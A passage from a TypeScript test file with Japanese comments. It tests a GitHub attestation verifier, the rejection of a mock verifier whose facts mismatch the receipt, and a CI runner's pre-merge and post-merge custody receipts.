      { result: { status: 1, stdout: "" }, reason: "missing" },
      { result: { status: 1, stdout: "verification failed" }, reason: "signature_unverified" },
      // spawn 不能 (gh 不在等) は「検証できなかった」であって「検証に失敗した」ではない。
      { result: { status: null, stdout: "" }, reason: "audit_unavailable" },
      { result: { status: 0, stdout: "{not json" }, reason: "audit_unavailable" },
      { result: { status: 0, stdout: "[]" }, reason: "audit_unavailable" },
      {
        result: { status: 0, stdout: JSON.stringify([{ verificationResult: {} }]) },
        reason: "audit_unavailable",
      },
    ];
    for (const entry of cases) {
      const verifier = createGhAttestationVerifier({ runCommand: () => entry.result });
      expect(await verifier.verify(query())).toEqual({ ok: false, reason: entry.reason });
    }
  });

  it("U-RVGHA-D3C-011: subject を被覆しない facts を返す verifier を domain が signer_mismatch で弾く", async () => {
    const lyingVerifier: GitHubAttestationVerifierPort = {
      verify: () =>
        Promise.resolve({
          ok: true,
          facts: {
            repository: REPOSITORY,
            workflowRef: WORKFLOW_REF,
            workflowSha: WORKFLOW_SHA,
            runId: RUN_ID,
            runAttempt: 1,
            issuer: ISSUER,
            subjectDigests: [OTHER_DIGEST],
          },
        }),
    };
    const decision = await admitReviewCustody(
      admissionInput({
        authority: { attestationVerifier: lyingVerifier, providerIdentity: APPROVED_IDENTITY },
      }),
    );
    expect(decision).toEqual({
      state: "custody_rejected",
      reasons: ["signer_mismatch"],
      details: ["attestation_facts_disagree_with_receipt"],
    });
  });
});

describe("D3d runner の merge 後 receipt kind", () => {
  it("U-RVGHA-D3C-008: MERGED facts から post_merge_closure を導出し、merge facts を receipt へ束縛する", () => {
    const fixture = runnerEnvironment({
      pullRequest: runnerPullRequest({ merged: true, mergedAt: MERGED_AT }),
      mergeMethod: "squash",
    });

    expect(issueCustodyReceipt(fixture.env)).toEqual({
      exitCode: 0,
      summary: expect.any(String),
    });
    const receipt = JSON.parse(fixture.written() ?? "{}") as Record<string, unknown>;
    expect(receipt).toMatchObject({
      receiptKind: "post_merge_closure",
      mergeSha: MERGE_SHA,
      mergeMethod: "squash",
      mergedAt: MERGED_AT,
    });
  });

  it("U-RVGHA-D3C-008: OPEN facts では pre_merge_review を維持し、merge metadata を要求しない", () => {
    const fixture = runnerEnvironment({ pullRequest: runnerPullRequest({ merged: false }) });

    expect(issueCustodyReceipt(fixture.env).exitCode).toBe(0);
    const receipt = JSON.parse(fixture.written() ?? "{}") as Record<string, unknown>;
    expect(receipt.receiptKind).toBe("pre_merge_review");
    expect(receipt).not.toHaveProperty("mergeSha");
    expect(receipt).not.toHaveProperty("mergeMethod");
    expect(receipt).not.toHaveProperty("mergedAt");
  });

  it("U-RVGHA-D3C-008: MERGED facts で merge method が欠落した場合は fail-close する", () => {
    const fixture = runnerEnvironment({
      pullRequest: runnerPullRequest({ merged: true, mergedAt: MERGED_AT }),
    });

    expect(() => issueCustodyReceipt(fixture.env)).toThrow(
      "missing required environment value: UT_TDD_CUSTODY_MERGE_METHOD",
    );
  });
});
